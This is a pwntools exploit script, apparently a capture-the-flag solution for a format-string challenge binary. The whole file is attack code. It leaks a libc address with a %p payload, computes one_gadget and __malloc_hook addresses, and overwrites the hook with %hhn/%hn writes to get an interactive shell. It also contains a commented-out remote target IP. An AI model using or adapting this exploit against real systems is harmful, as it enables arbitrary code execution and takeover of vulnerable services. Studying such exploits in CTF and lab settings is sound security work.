from pwn import *
libc = ELF('libc')
p= process('./format')
#p = remote('165.232.101.11',32270)
pid = gdb.attach(p,gdbscript="""
    b * echo + 57
    """
)
offset = libc.sym['_IO_2_1_stderr_']
payload_leak_libc = 'AAAAAAAA %21$p'
p.sendline(payload_leak_libc)
leak_libc = int(p.recvline().split(' ')[1].replace('\n',''),16)
libc_base = leak_libc - offset
one_gadget1_offset = 0x4f2c5
one_gadget2_offset = 0x4f322
one_gadget3_offset = 0x10a38c
one_gadget = libc_base + one_gadget2_offset

malloc_hook = libc_base + libc.sym['__malloc_hook']
print "offset of stderr: " + hex(offset)
print "leak: " + hex(leak_libc)
print "libc base: "+ hex(libc_base)
print "one gadget addr: " +hex(one_gadget)
print "malloc_hook addr: "+hex(malloc_hook)

last_two_bytes = one_gadget&0xffff
jeben_en_byte = one_gadget&0xff0000
jeben_en_byte = jeben_en_byte >>16
print "how much chars to write: "+hex(last_two_bytes)
print "jeben byte: "+hex(jeben_en_byte)

payload_malloc_hook_override ='AAAA%'+str(jeben_en_byte-4)+"x%10$hhn"+'AAA%'+str(last_two_bytes-3-jeben_en_byte)+"x%11$hn"+p64(malloc_hook+2)+p64(malloc_hook)
p.sendline(payload_malloc_hook_override)
p.recv(100000)
p.sendline("%1111111x")
p.interactive()
